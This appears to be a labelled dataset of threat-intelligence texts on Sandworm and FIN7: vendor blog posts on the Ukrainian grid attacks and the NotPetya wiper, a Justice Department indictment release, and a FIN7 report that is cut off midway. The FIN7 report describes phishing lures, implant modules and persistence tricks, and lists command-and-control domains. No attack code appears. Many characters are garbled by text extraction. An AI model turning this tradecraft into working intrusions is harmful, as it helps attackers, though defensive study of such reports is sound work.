trends in SecOps. Sign Up     Privacy Policy ReliaQuest Platform and Support Agreement © 2024 ReliaQuest, LLC All Rights Reserved"
sandworm,cti-hal,14d44c8fd513,G0034,"Cloud Contact sales Get started for free Blog Solutions & technology Ecosystem Developers & Practitioners Transform with Google Cloud Threat Intelligence Sandworm Team and the Ukrainian Power Authority Attacks January 7, 2016 Mandiant Wri!en by: John Hultquist Update 1.11.16 - SANS ICS Team Connects Dots Updating the blog entry to bring a!ention to the recent analysis published by Mike Assante from the SANS ICS team. ""A""er analyzing the information that has been made available by a#ected power companies, researchers, and the media it is clear that cyber a!acks were directly responsible for power outages in Ukraine. The SANS ICS team has been coordinating ongoing discussions and providing analysis across multiple international community members and companies. We assess with high con$dence based on company statements, media repo%s, and $rst-hand analysis that the incident was due to a coordinated intentional a!ack."" Read the full SANS post here - and see below for iSIGHT iSIGHT Pa!ners Analyst Comment The SANS ICS blog con$rms conclusions previously reached by iSIGHT regarding the nature of the Ukrainian a!acks (speci$cally the role of destructive malware and phone disruption) and a!ribution to Sandworm Team. iSIGHT Pa%ners believes this incident is a milestone because it is the $rst major cyber a!ack to substantially a#ect the civilian population and because of the overwhelming impo%ance of the grid to multiple reliant sectors. Fu%hermore, Sandworm Team's previous interest in US and European critical systems underscores the threat they pose (see below for more on Sandworm Team.) Sandworm Team - Historical Targeting of Ukraine and Interest in SCADA Systems Since last week, iSIGHT Pa%ners has worked to provide details on the power outage in Ukraine to our global customers. We have analyzed the forensic evidence we have been able to obtain from the region, contextualizing it within our knowledge of cyber espionage actors. Many details of the event remain unknown, and given the nature of the incident, especially the use of destructive malware, we do not anticipate every detail will be exposed. However, we have linked Sandworm Team to the incident, principally based on BlackEnergy 3, the malware that has become their calling card. iSiGHT Pa%ners has tracked Sandworm Team for some time - and we publicly repo%ed on some of their activities in October 2014, when we discovered their use of a zero-day exploit, CVE-2014- 4114. In that campaign, we saw targeting of Ukrainian government o&cials, members of the EU and NATO. Sho%ly a""er releasing information on their espionage operations, our friends at TrendMicro found evidence that the operators were not only conducting classic strategic espionage but targeting SCADA systems as well. Evidence of this accumulated, and iSIGHT Pa%ners released a follow-up blog were we assessed that activity was reconnaissance for a!ack - a preparation for cyber a!ack to be carried out in the long term. ICS-CERT released a separate advisory as well. Sandworm Team Activity - Late 2014 to Current Day Sandworm Team went to ground sho%ly a""er being exposed in October of 2014, and malware with Dune references (the genesis for the 'Sandworm' moniker) which we had previously used to track them disappeared entirely. However, the unique malware variant, BlackEnergy 3, reemerged in Ukraine early in 2015, where we had $rst found Sandworm Team. Throughout 2015 we saw increased intrusion activity using BlackEnergy 3. We warned our clients of new features suggesting an increased focus on European targets - though veri$cation of targets was not possible at the time. Additionally, we warned our customers about the targeting of both media and regional power authorities in the Ukraine, sectors later a#ected by cyber a!acks. Some of this information was recently shared by the folks at ESET, who have also been following Sandworm Team very closely for quite some time. On the Ukrainian Power Authority Incidents Last week iSIGHT's sources provided us with the same KillDisk malware published by Rob Lee of SANS and Dragos Security. As ESET has, we place this malware within the greater context of activity tied to BlackEnergy 3, which we believe is Sandworm Team. We believe this KillDisk malware is related to the destructive malware leveraged during Ukrainian elections in October. At the time, CERT-UA connected that incident to BlackEnergy 3. Symantec has since veri$ed those claims. Fu%hermore, iSIGHT's own sources indicate that BlackEnergy 3 malware was deployed on at least one of the Ukrainian power systems a#ected by KillDisk. iSIGHT Pa%ners is still collecting information on the mechanics of the power outage and what role the KillDisk malware played in the greater event. We cannot con$rm that the KillDisk malware caused the outage. It may have been used following steps to manipulate power in order to impede restoration e#o%s or operator visibility. It is notewo%hy that technical suppo% numbers associated with the power authorities were allegedly 'ooded with calls, which may have been an e#o% to fu%her overwhelm responders. On their o&cial website, the Ukrainian security service, SBU, made this claim. Outlook A cyber a!ack of this nature is a milestone -although a predictable one. The aggressive nature of Sandworm Team's previous activity in Europe and the United States exposed their interest in targeting critical systems and indicated preparation for cyber a!ack. Targeting of critical entities in Ukraine throughout 2015, during a time of war, fu%her presaged a desire to disrupt infrastructure. Posted in Threat Intelligence—Security & Identity Related articles Threat Intelligence Threat Intelligence Threat Intelligence Threat Intelligence XRefer: The Gemini-Assisted Binary Navigator By Mandiant • 26-minute read Bridging the Gap: Elevating Red Team Assessments with Application Security Testing (QR) Coding My Way Out of Here: C2 in Browser Isolation Environments By Mandiant • 8-minute By Mandiant • 13-minute read read Seeing Through a GLASSBRIDGE: Understanding the Digital Marketing Ecosystem Spreading Pro- PRC In""uence Operations By Google Threat Intelligence Group • 13- minute read Follow us Google Cloud Google Cloud Products Privacy Terms Help English"
sandworm,cti-hal,7dfae7eb815f,G0034,"Content menu Search... Subscribe ExPetr/Petya/NotPetya is a Wiper, Not Ransomware 28 JUN 2017 1 minute read INCIDENTS GREAT WEBINARS 13 MAY 2021, 1:00PM GReAT Ideas. Balalaika Edition BORIS LARIN, DENIS LEGEZO 26 FEB 2021, 12:00PM GReAT Ideas. Green Tea Edition JOHN HULTQUIST, BRIAN BARTHOLOMEW, SUGURU ISHIMARU, VITALY KAMLUK, SEONGSU PARK, YUSUKE NIWA, MOTOHIKO SATO 17 JUN 2020, 1:00PM GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots MARCO PREUSS, DENIS LEGEZO, COSTIN RAIU, KURT BAUMGARTNER, DAN DEMETER, YAROSLAV SHMELEV 26 AUG 2020, 2:00PM GReAT Ideas. Powered by SAS: threat actors advance on new fronts IVAN KWIATKOWSKI, MAHER YAMOUT, NOUSHIN SHABAB, PIERRE DELCHER, FÉLIX AIME, GIAMPAOLO DEDOLA, // AUTHORS ANTON IVANOV ORKHAN MAMEDOV After an analysis of the encryption routine of the malware Petya/ExPetr attacks used in the , we have thought that the threat actor cannot decrypt victims’ disk, even if a payment was made. This supports the theory that this malware campaign was SANTIAGO PONTIROLI not designed as a ransomware attack for !nancial gain. Instead, it appears it was designed as a to be ransomware. wiper pretending 22 JUL 2020, 2:00PM GReAT Ideas. Powered by SAS: threat hunting and new techniques Below the technical details are presented. First, in order to DMITRY BESTUZHEV, COSTIN RAIU, PIERRE DELCHER, decrypt victim’s disk the attackers need the installation ID: BRIAN BARTHOLOMEW, BORIS LARIN, ARIEL JUNGHEIT, FABIO ASSOLINI In previous versions of “similar” ransomware like Petya/Mischa/GoldenEye, this installation ID contains crucial information for the key recovery. After sending this information to the attacker they can extract the decryption key using their private key. Here’s how this installation ID is generated in the ExPetr ransomware: This installation ID in our test case is built using the CryptGenRandom function, which is basically generating random data. The following bu""er contains the randomly generated data in an encoded “BASE58” format: FROM THE SAME AUTHORS Sodin ransomware exploits Windows vulnerability and processor architecture KeyPass ransomware SynAck targeted ransomware uses the Doppelgänging technique Mining is the new black Bad Rabbit ransomware If we compare this randomly generated data and the !nal installation ID shown in the !rst screen, they are the same. In a normal setup, this string should contain encrypted information that will be used to restore the decryption key. For ExPetr, the ID shown in the ransom screen is just plain random data. That means that the attacker cannot extract any decryption information from such a randomly generated string displayed on the victim, and as a result, the victims will not be able to decrypt any of the encrypted disks using the installation ID. What does it mean? Well, !rst of all, this is the worst-case news for the victims – even if they pay the ransom they will not get their data back. Secondly, this reinforces the theory that the main goal of the ExPetr attack was not !nancially motivated, but destructive. Our friend Matt Suiche from Comae Technologies independently came to the same conclusion . DATA ENCRYPTION MALWARE DESCRIPTIONS PETYA RANSOMWARE WIPER Subscribe to our weekly e-mails The hottest research right in your inbox Email(Required) I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I !nd at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe ExPetr/Petya/NotPetya is a Wiper, Not Ransomware Your email address will not be published. Required !elds are marked * Type your comment here Name * Email * Comment RAMALINGAM Posted on June 29, 2017. 4:23 am is the kaspersky update equipped to deal with the ExPetr/Petya/NotPetya wiper/ Reply ARASH ZANGENEH Posted on June 29, 2017. 9:21 am Yes, at least our KES 10, managed to block it. Reply JO Posted on June 29, 2017. 8:33 am I agree that this is a wiper and not a Ransomware however sometimes that actual Malware may not be the main motive behind the attack. This to me is either a currency manipulation on a large scale or simply cyber terrorism. You can check out the theory below http://www.securityweek.com/latest-wannacry-theory- currency-manipulation Reply DIAZOMETHAN Posted on June 29, 2017. 8:44 am Weak reason to classify it as a wiper, in my opinion. Wouldn’t it be possible that the author stores the key and the ID in a table? In this case, it is nothing more than IN THE SAME CATEGORY XZ backdoor: Hook analysis Assessing the Y, and How, of the XZ Utils incident XZ backdoor story – Initial analysis A hack in hand is worth two in the bush the bush QBot banker delivered through business correspondence something like a UUID, but it would be still possible for the attacker to decrypt the data. Matt Suiche gives the better explanation why it is a wiper: Because it destroys some crucial data. Reply JANIKO Posted on June 29, 2017. 1:49 pm I’d like more info about this : the ID is random, right ? And about the encryption key : is it generated elsewhere ? Is it sent with that random ID to a C&C ? And is it really a wiper or only a bad-written ransomware ? Reply ANDREA Posted on June 29, 2017. 7:59 pm Hi we have also this detailed analysis https://www.crowdstrike.com/blog/petrwrap- ransomware-technical-analysis-triple-threat-!le- encryption-mft-encryption-credential-theft/ We have been able to retrieve most of the !les of infected computers. However, as expetya does crypt some of them BEFORE actually being visible, those are encrypted. The TXT are safe, so that means that they’re not simply corrupted, but encrypted. Given the key in the README.TXT !le, do you think they can actually be decrypted? NOte that for many !les we also have the same exact !le BEFORE encryption. Reply PETE Posted on June 30, 2017. 10:52 am Ok ID is random – so what? Did you proove that the random ID has nothing to do with the encryption key? Reply // LATEST POSTS SOC, TI AND IR POSTS APT REPORTS CRIMEWARE REPORTS MALWARE DESCRIPTIONS Attackers exploiting a patched FortiClient EMS vulnerability in the wild Lazarus group evolves its infection chain with old and new malware Analysis of Cyber Anarchy Squad attacks targeting Russian and Belarusian organizations Download a banker to track your parcel ASHLEY MUÑOZ, FRANCESCO FIGURELLI, CRISTIAN SOUZA, EDUARDO OVALLE, AREG BAGHINYAN VASILY BERDNIKOV, SOJUN RYU KASPERSKY DMITRY KALININ // LATEST WEBINARS THREAT INTELLIGENCE AND IR 04 SEP 2024, 5:00PM 60 MIN Inside the Dark Web: exploring the human side of cybercriminals TECHNOLOGIES AND SERVICES 13 AUG 2024, 5:00PM 60 MIN The Cybersecurity Buyer’s Dilemma: Hype vs (True) Expertise OLEG GOROBETS, CYBERTHREAT TALKS 60 MIN 16 JUL 2024, 5:00PM Cybersecurity’s human factor – more than an unpatched vulnerability TRAININGS AND WORKSHOPS 09 JUL 2024, 4:00PM 60 MIN Building and prioritizing detection engineering backlogs with MITRE ATT&CK ANNA PAVLOVSKAYA ALEXANDER LISKIN OLEG GOROBETS ANDREY TAMOYKIN // REPORTS BellaCPP: Discovering a new Lazarus group evolves its BellaCPP: Discovering a new BellaCiao variant written in C++ While investigating an incident involving the BellaCiao .NET malware, Kaspersky researchers discovered a C++ version they dubbed “BellaCPP”. Lazarus group evolves its infection chain with old and new malware Lazarus targets employees of a nuclear-related organization with a bunch of malware, such as MISTPEN, LPEClient, RollMid, CookieTime and a new modular backdoor CookiePlus. Careto is back: what’s new after 10 years of silence? Kaspersky researchers analyze 2019, 2022 and 2024 attacks attributed to Careto APT with medium to high con!dence. APT trends report Q3 2024 The report features the most signi!cant developments relating to APT groups in Q3 2024, including hacktivist activity, new APT tools and campaigns. // SUBSCRIBE TO OUR WEEKLY E- MAILS The hottest research right in your inbox Email Subscribe I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I !nd at the bottom of any e-mail sent to me for the purposes mentioned above. THREATS CATEGORIES OTHER SECTIONS APT (Targeted attacks) APT reports Secure environment (IoT) Mobile threats Financial threats Malware descriptions Security Bulletin Malware reports Archive All tags Webinars APT Logbook Spam and phishing Statistics Spam and phishing reports Industrial threats Security technologies Web threats Research Vulnerabilities and Publications exploits All threats All categories Encyclopedia Threats descriptions KSB 2024 © 2024 AO Kaspersky Lab. All Rights Reserved. Registered trademarks and service marks are the property of their respective owners. Privacy Policy License Agreement Cookies"
sandworm,cti-hal,beb7f21b6d1f,G0034,"PRESS RELEASE Six Russian GRU O!cers Charged in Connection with Worldwide Deployment of Destructive Malware and Other Disruptive Actions in Cyberspace Monday, October 19, 2020 For Immediate Release Ofﬁce of Public Affairs Defendants’ Malware Attacks Caused Nearly One Billion USD in Losses to Three Victims Alone; Also Sought to Disrupt the 2017 French Elections and the 2018 Winter Olympic Games On Oct. 15, 2020, a federal grand jury in Pittsburgh returned an indictment charging six computer hackers, all of whom were residents and nationals of the Russian Federation (Russia) and ofﬁcers in Unit 74455 of the Russian Main Intelligence Directorate (GRU), a military intelligence agency of the General Staff of the Armed Forces. These GRU hackers and their co-conspirators engaged in computer intrusions and attacks intended to support Russian government efforts to undermine, retaliate against, or otherwise destabilize: (1) Ukraine; (2) Georgia; (3) elections in France; (4) efforts to hold Russia accountable for its use of a weapons-grade nerve agent, Novichok, on foreign soil; and (5) the 2018 PyeongChang Winter Olympic Games after Russian athletes were banned from participating under their nation’s ﬂag, as a consequence of Russian government-sponsored doping effort. Their computer attacks used some of the world’s most destructive malware to date, including: KillDisk and Industroyer, which each caused blackouts in Ukraine; NotPetya, which caused nearly $1 billion in losses to the three victims identiﬁed in the indictment alone; and Olympic Destroyer, which disrupted thousands of computers used to support the 2018 PyeongChang Winter Olympics. The indictment charges the defendants with conspiracy, computer hacking, wire fraud, aggravated identity theft, and false registration of a domain name. According to the indictment, beginning in or around November 2015 and continuing until at least in or around October 2019, the defendants and their co-conspirators deployed destructive malware and took other disruptive actions, for the strategic beneﬁt of Russia, through unauthorized access to victim computers (hacking). As alleged, the conspiracy was responsible for the following destructive, disruptive, or otherwise destabilizing computer intrusions and attacks: • • • • • • Ukrainian Government & Critical Infrastructure: December 2015 through December 2016 destructive malware attacks against Ukraine’s electric power grid, Ministry of Finance, and State Treasury Service, using malware known as BlackEnergy, Industroyer, and KillDisk; French Elections: April and May 2017 spearphishing campaigns and related hack-and-leak efforts targeting French President Macron’s “La République En Marche!” (En Marche!) political party, French politicians, and local French governments prior to the 2017 French elections; Worldwide Businesses and Critical Infrastructure (NotPetya): June 27, 2017 destructive malware attacks that infected computers worldwide using malware known as NotPetya, including hospitals and other medical facilities in the Heritage Valley Health System (Heritage Valley) in the Western District of Pennsylvania; a FedEx Corporation subsidiary, TNT Express B.V.; and a large U.S. pharmaceutical manufacturer, which together suffered nearly $1 billion in losses from the attacks; PyeongChang Winter Olympics Hosts, Participants, Partners, and Attendees: December 2017 through February 2018 spearphishing campaigns and malicious mobile applications targeting South Korean citizens and ofﬁcials, Olympic athletes, partners, and visitors, and International Olympic Committee (IOC) ofﬁcials; PyeongChang Winter Olympics IT Systems (Olympic Destroyer): December 2017 through February 2018 intrusions into computers supporting the 2018 PyeongChang Winter Olympic Games, which culminated in the Feb. 9, 2018, destructive malware attack against the opening ceremony, using malware known as Olympic Destroyer; Novichok Poisoning Investigations: April 2018 spearphishing campaigns targeting investigations by the Organisation for the Prohibition of Chemical Weapons (OPCW) and the United Kingdom’s Defence Science and Technology Laboratory (DSTL) into the nerve agent poisoning of Sergei Skripal, his daughter, and several U.K. citizens; and • Georgian Companies and Government Entities: a 2018 spearphishing campaign targeting a major media company, 2019 efforts to compromise the network of Parliament, and a wide-ranging website defacement campaign in 2019. Cybersecurity researchers have tracked the Conspirators and their malicious activity using the labels “Sandworm Team,” “Telebots,” “Voodoo Bear,” and “Iron Viking.” The charges were announced by Assistant Attorney General John C. Demers; FBI Deputy Director David Bowdich; U.S. Attorney for the Western District of Pennsylvania Scott W. Brady; and Special Agents in Charge of the FBI’s Atlanta, Oklahoma City, and Pittsburgh Field Ofﬁces, J.C. “Chris” Hacker, Melissa R. Godbold, and Michael A. Christman, respectively. “No country has weaponized its cyber capabilities as maliciously or irresponsibly as Russia, wantonly causing unprecedented damage to pursue small tactical advantages and to satisfy ﬁts of spite,” said Assistant Attorney General for National Security John C. Demers. “Today the department has charged these Russian ofﬁcers with conducting the most disruptive and destructive series of computer attacks ever attributed to a single group, including by unleashing the NotPetya malware. No nation will recapture greatness while behaving in this way.” “The FBI has repeatedly warned that Russia is a highly capable cyber adversary, and the information revealed in this indictment illustrates how pervasive and destructive Russia’s cyber activities truly are,” said FBI Deputy Director David Bowdich. “But this indictment also highlights the FBI’s capabilities. We have the tools to investigate these malicious malware attacks, identify the perpetrators, and then impose risks and consequences on them. As demonstrated today, we will relentlessly pursue those who threaten the United States and its citizens.” “For more than two years we have worked tirelessly to expose these Russian GRU Ofﬁcers who engaged in a global campaign of hacking, disruption and destabilization, representing the most destructive and costly cyber-attacks in history,” said U.S. Attorney Scott W. Brady for the Western District of Pennsylvania. “The crimes committed by Russian government ofﬁcials were against real victims who suffered real harm. We have an obligation to hold accountable those who commit crimes – no matter where they reside and no matter for whom they work – in order to seek justice on behalf of these victims.” “The exceptional talent and dedication of our teams in Pittsburgh, Atlanta and Oklahoma City who spent years tracking these members of the GRU is unmatched,” said FBI Pittsburgh Special Agent in Charge Michael A. Christman. “These criminals underestimated the power of shared intelligence, resources and expertise through law enforcement, private sector and international partnerships.” The defendants, Yuriy Sergeyevich Andrienko (Юрий Сергеевич Андриенĸо), 32; Sergey Vladimirovich Detistov (Сергей Владимирович Детистов), 35; Pavel Valeryevich Frolov (Павел Валерьевич Фролов), 28; Anatoliy Sergeyevich Kovalev (Анатолий Сергеевич Ковалев), 29; Artem Valeryevich Ochichenko (Артем Валерьевич Очиченĸо), 27; and Petr Nikolayevich Pliskin (Петр Ниĸолаевич Плисĸин), 32, are all charged in seven counts: conspiracy to conduct computer fraud and abuse, conspiracy to commit wire fraud, wire fraud, damaging protected computers, and aggravated identity theft. Each defendant is charged in every count. The charges contained in the indictment are merely accusations, however, and the defendants are presumed innocent unless and until proven guilty beyond a reasonable doubt. The indictment accuses each defendant of committing the following overt acts in furtherance of the charged crimes: Defendant Summary of Overt Acts Yuriy Sergeyevich Andrienko Sergey Vladimirovich Detistov Pavel Valeryevich Frolov · Developed components of the NotPetya and Olympic Destroyer malware. · Developed components of the NotPetya malware; and · Prepared spearphishing campaigns targeting the 2018 PyeongChang Winter Olympic Games. · Developed components of the KillDisk and NotPetya malware. · Developed spearphishing techniques and messages used to target: Anatoliy Sergeyevich Kovalev - En Marche! ofﬁcials; - employees of the DSTL; - members of the IOC and Olympic athletes; and - employees of a Georgian media entity. · Participated in spearphishing campaigns targeting 2018 PyeongChang Winter Olympic Games partners; and Artem Valeryevich · Conducted technical reconnaissance of the Parliament of Georgia ofﬁcial domain and attempted to gain Ochichenko unauthorized access to its network. Petr Nikolayevich Pliskin · Developed components of the NotPetya and Olympic Destroyer malware. The defendants and their co-conspirators caused damage and disruption to computer networks worldwide, including in France, Georgia, the Netherlands, Republic of Korea, Ukraine, the United Kingdom, and the United States. The NotPetya malware, for example, spread worldwide, damaged computers used in critical infrastructure, and caused enormous ﬁnancial losses. Those losses were only part of the harm, however. For example, the NotPetya malware impaired Heritage Valley’s provision of critical medical services to citizens of the Western District of Pennsylvania through its two hospitals, 60 ofﬁces, and 18 community satellite facilities. The attack caused the unavailability of patient lists, patient history, physical examination ﬁles, and laboratory records. Heritage Valley lost access to its mission-critical computer systems (such as those relating to cardiology, nuclear medicine, radiology, and surgery) for approximately one week and administrative computer systems for almost one month, thereby causing a threat to public health and safety. The conspiracy to commit computer fraud and abuse carries a maximum sentence of ﬁve years in prison; conspiracy to commit wire fraud carries a maximum sentence of 20 years in prison; the two counts of wire fraud carry a maximum sentence of 20 years in prison; intentional damage to a protected computer carries a maximum sentence of 10 years in prison; and the two counts of aggravated identity theft carry a mandatory sentence of two years in prison. The indictment also alleges false registration of domain names, which would increase the maximum sentence of imprisonment for wire fraud to 27 years in prison; the maximum sentence of imprisonment for intentional damage to a protected computer to 17 years in prison; and the mandatory sentence of imprisonment for aggravated identity theft to four years in prison. These maximum potential sentences are prescribed by Congress, however, and are provided here for informational purposes only, as the assigned judge will determine any sentence of a defendant. Defendant Kovalev was previously charged in federal indictment number CR 18-215, in the District of Columbia, with conspiring to gain unauthorized access into the computers of U.S. persons and entities involved in the administration of the 2016 U.S. elections. Trial Attorney Heather Alpino and Deputy Chief Sean Newell of the National Security Division’s Counterintelligence and Export Control Section and Assistant U.S. Attorneys Charles Eberle and Jessica Smolar of the U.S. Attorney’s Ofﬁce for the Western District of Pennsylvania are prosecuting this case. The FBI’s Atlanta, Oklahoma City, and Pittsburgh ﬁeld ofﬁces conducted the investigation, with the assistance of the FBI’s Cyber Division. The Criminal Division’s Ofﬁce of International Affairs provided critical assistance in this case. The department also appreciates the signiﬁcant cooperation and assistance provided by Ukrainian authorities, the Governments of the Republic of Korea and New Zealand, Georgian authorities, and the United Kingdom’s intelligence services, as well as many of the FBI’s Legal Attachés and other foreign authorities around the world. Numerous victims cooperated and provided valuable assistance in the investigation. The department is also grateful to Google, including its Threat Analysis Group (TAG); Cisco, including its Talos Intelligence Group; Facebook; and Twitter, for the assistance they provided in this investigation. Some private sector companies independently disabled numerous accounts for violations of the companies’ terms of service. Updated July 13, 2022 Attachments 10.19.2020 unsealed indictment [PDF, 2 MB] 10.19.20 Exhibit A [PDF, 323 KB] Topics COUNTERING NATION-STATE THREATS NATIONAL SECURITY Components Federal Bureau of Investigation (FBI) National Security Division (NSD) USAO - Pennsylvania, Western Press Release Number: 20-1,117 Related Content PRESS RELEASE PRESS RELEASE PRESS RELEASE U.S. Army Soldier Sentenced to 14 Years in Prison For Attempting to Assist ISIS to Conduct Deadly Ambush on U.S. Troops Cole Bridges, also known as Cole Gonzales, 24, of Stow, Ohio, was sentenced to 168 months in prison followed by 10 years of supervised release for attempting to provide material... Court-Authorized Operation Disrupts Worldwide Botnet Used by People’s Republic of China State-Sponsored Hackers The Justice Department today announced a court-authorized law enforcement operation that disrupted a botnet consisting of more than 200,000 consumer devices in the United States and worldwide. As described in... Suspect at Trump International Golf Course Charged with Firearms O!enses Ryan Wesley Routh, 58, of Hawaii, has been charged by a criminal complaint in the Southern District of Florida with ﬁrearms charges related to an incident at Trump International Golf... October 11, 2024 September 18, 2024 September 16, 2024 Ofﬁce of Public Affairs U.S. Department of Justice 950 Pennsylvania Avenue, NW Washington DC 20530 Ofﬁce of Public Affairs Direct Line 202-514-2007 Department of Justice Main Switchboard 202-514-2000"
sandworm,cti-hal,1a80ea7693dc,G0034,
fin7,cti-hal,41899de0a3c3,G0046,"FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities 08 MAY 2019 10 minute read APT REPORTS // AUTHORS YURY NAMESTNIKOV FÉLIX AIME On August 1, 2018, the US Department of Justice announced that it had arrested several individuals suspected of having ties to the FIN7 cybercrime rig. FIN7 operations are linked to numerous intrusion attempts having targeted hundreds of companies since at least as early as 2015. Interestingly, this threat actor created fake companies in order to hire remote pentesters, developers and interpreters to participate in their malicious business. The main goal behind its malicious activities was to steal !nancial assets from companies, such as debit cards, or get access to !nancial data or computers of !nance department employees in order to conduct wire transfers to o""shore accounts. In 2018-2019, researchers of Kaspersky Lab’s Global Research and Analysis Team analyzed various campaigns that used the same Tactics Tools and Procedures (TTPs) https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 1 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 as the historic FIN7, leading the researchers to believe that this threat actor had remained active despite the 2018 arrests. In addition, during the investigation, we discovered certain similarities to other attacker groups that seemed to share or copy the FIN7 TTPs in their own operations. Recent FIN7 campaigns The FIN7 intrusion set continued its tailored spear phishing campaigns throughout last year. Kaspersky Lab has been able to retrieve some of these exchanges from a FIN7 target. The spear phishing campaigns were remarkably sophisticated from a social engineering perspective. In various cases, the operators exchanged numerous messages with their victims for weeks before sending their malicious documents. The emails were e""icient social- engineering attempts that appealed to a vast number of human emotions (fear, stress, anger, etc.) to elicit a response from their victims. One of the domains used by the attackers in their 2018 campaign of spear phishing contained more than 130 email aliases, leading us to think that more than 130 companies had been targeted by the end of 2018. Malicious Documents We have seen two types of documents sent to victims in these spear phishing campaigns. The !rst one exploits the INCLUDEPICTURE feature of Microsoft Word to get context information about the victim’s computer, and the availability and version number of Microsoft Word. The second one, which in many cases is an O""ice document protected with a trivial password, such as “12345”, “1234”, etc., uses macros to execute a GRIFFON implant on the target’s computer. In various cases, the associated macro also scheduled tasks to make GRIFFON persistent. Interestingly, following some open-source publications about them, the FIN7 operators seems to have developed a homemade builder of malicious O""ice document using ideas from ThreadKit, which they employed during the summer of 2018. The new builder inserts random values in https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 2 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 the Author and Company metadata !elds. Moreover, the builder allows these to modify di""erent IOCs, such as the !lenames of wscript.exe or sctasks.exe copies, etc. wscript.exe sctasks Task name C2 copy copy byzNne10.exe byzNne17.exe TaskbyzNne logitech-cdn.com c9FGG10.exe c9FGG17.exe Taskc9FGG logitech-cdn.com zEsb10.exe zEsb17.exe TaskzEsb servicebing- cdn.com IOCs extracted from docs which use sctasks for GRIFFON persistence Author Company wscript.exe C2 copy mogjxjtvte mogjxjtvte mswmex44.exe logitech-cdn[.]com soxvremvge soxvremvge c9FGG10.exe logitech-cdn[.]com gareljtjhvd gareljtjhvd zEsb10.exe servicebing- cdn[.]com IOCs extracted from regular documents associated to GRIFFON GRIFFON Implant https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 3 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 Gri!on Malware attack pattern The GRIFFON implant is a lightweight JScript validator- style implant without any persistence mechanism. The malware is designed for receiving modules to be executed in-memory and sending the results to C2s. We were able to obtain four di""erent modules during the investigation. Reconnaissance module The !rst module downloaded by the GRIFFON malware to the victim’s computer is an information-gathering JScript, which allows the cybercriminals to understand the context of the infected workstation. This module mainly relies on WMI and Windows objects to deliver results, which will be sent back to the operators. Interestingly, more than 20 artifacts are retrieved from the system by this implant during the reconnaissance stage, from the date and time of operating system installation and membership in a Windows domain to a list of and the resolutions of the workstation’s monitors. Meterpreter downloader The second module is used by the operators to execute an obfuscated PowerShell script, which contains a Meterpreter downloader widely known as “Tinymet“. This downloader, seen in past FIN7 campaigns, downloads a one-byte XOR-encrypted (eg. with the key equal to 0x50 or 0x51) piece of meterpreter shellcode to execute. Screenshot module The third module allows the operators to take a screenshot of the remote system. To do that, it also drops a PowerShell script on the workstation to execute. The script executes an open-source .NET class used for taking a screenshot. The resulting screenshot is saved at “%TMP%/image.png”, sent back to the attackers by the GRIFFON implant and then deleted. KSB WEBINARS 02 FEB 2021, 12:00PM 2021 predictions, episode 1: !nancial cyberthreats ANCHISES MORAES, OLAF SCHWARZ 04 FEB 2021, 12:00PM 2021 predictions, episode 2: healthcare cyberthreats MARIA NAMESTNIKOVA 11 FEB 2021, 12:00PM 2021 predictions, episode 3: ICS cyberthreats EVGENY GONCHAROV 26 JAN 2021, 12:00PM Kaspersky’s Advanced Targeted Threat Predictions For 2021 ARIEL JUNGHEIT, COSTIN RAIU, DAVID EMM 25 JAN 2021, 12:00PM Remote working in 2020: lessons learnt DMITRY GALOV https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 4 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 Persistence module The last retrieved module is a persistence module. If the victim appears valuable to the attackers, a GRIFFON implant installer is pushed to the victim’s workstation. This module stores another instance of the GRIFFON implant inside the registry to achieve persistence. Here is a PowerLinks-style method used by the attackers to achieve persistence and execute the GRIFFON implant at each user logon. The new GRIFFON implant is written to the hard drive before each execution, limiting the “!le-less” aspect of this method. Through its light weight and modular architecture, the GRIFFON implant is the perfect validator. Even though we have been able to retrieve four di""erent modules, it is possible that the FIN7 operators have more modules in their toolsets for achieving their objectives on the victim’s workstation. On the hunt for GRIFFON infrastructure Attackers make mistakes, and FIN7 are no exception. The major error made by its operators allowed us to follow the command and control server of the GRIFFON implant last year. In order to trick blue teams and other DFIR analysts, the operators created fake HTTP 302 redirection to various Google services on their C2s servers. 1 2 3 4 5 6 7 HTTP/1.1 302 Found Server: nginx Date: [retracted] Content-Type: text/html; charset=UTF-8 Content-Length: 0 Connection: keep-alive Location: https://cloud.google.com/cdn/ Returned headers for most of the GRIFFON C2s servers on port 443 This error allowed us to follow the infrastructure week by week, until an individual pushed on Twitter the heuristic to track their C2 at the end of December 2018. A few days after the tweet, in January 2019, the operators changed their landing page in order to prevent this type of tracking https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 5 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 against their infrastructure. Fake pentest company During the investigation related to the GRIFFON infrastructure, we found a strange overlap between the WHOIS record of an old GRIFFON C2 and the website of a fake company. According to the website, that domain supposedly belongs to a legitimate security company “fully owned by the Russian Government” (sic.) and having o""ices in “Moscow, Saint Petersburg and Yekaterinburg”, but the address says the company is located in Trump Tower, in New York. Given FIN7’s previous use of false security companies, we decided to look deeper into this one. As we were looking at the content of the website, it became evident that almost all of the text used was lifted from legitimate security-company websites. Phrases and sentences were borrowed from at least the following companies/sites: DKSec – www.dksec.com OKIOK – www.okiok.com/services/tailored-solutions MainNerve – www.mainnerve.com Datics – www.datatics.com/cyber-security Perspective Risk – www.perspectiverisk.com Synack – https://www.synack.com/company FireEye – https://www.!reeye.com/services/penetration- 